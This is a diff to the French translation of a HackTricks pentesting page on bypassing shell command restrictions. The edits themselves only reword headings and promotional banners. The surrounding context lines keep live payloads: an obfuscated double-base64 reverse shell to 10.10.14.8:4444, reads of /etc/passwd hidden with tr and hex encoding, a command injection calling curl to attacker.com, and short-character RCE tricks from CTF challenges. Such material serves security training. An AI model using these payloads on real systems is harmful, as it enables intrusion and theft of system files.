@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Autres façons de soutenir HackTricks :
 
@@ -14,7 +14,7 @@ Autres façons de soutenir HackTricks :
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
@@ -22,7 +22,7 @@ Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Contournements de Limitations Courantes
+## Contournement des limitations courantes
 
 ### Shell Inversé
 ```bash
@@ -30,7 +30,7 @@ Accédez dès aujourd'hui :
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Coquille inversée courte
+### Coquille Rev courte
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -135,7 +135,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Contourner avec un encodage hexadécimal
+### Contourner avec l'encodage hexadécimal
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -229,13 +229,11 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
-
-### Bashfuscator
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### Exécution de code à distance avec 5 caractères
+### RCE avec 5 caractères
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -282,7 +280,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### Exécution de code à distance avec 4 caractères
+### RCE avec 4 caractères
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -317,7 +315,7 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Contournement de la restriction en lecture seule/Noexec/Distroless
+## Contournement de la protection en lecture seule/Noexec/Distroless
 
 Si vous vous trouvez dans un système de fichiers avec les **protections en lecture seule et noexec** ou même dans un conteneur distroless, il existe encore des moyens d'**exécuter des binaires arbitraires, voire un shell !:**
 
@@ -338,7 +336,7 @@ Si vous vous trouvez dans un système de fichiers avec les **protections en lect
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
@@ -355,7 +353,7 @@ Autres façons de soutenir HackTricks :
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez** 💬 le **groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
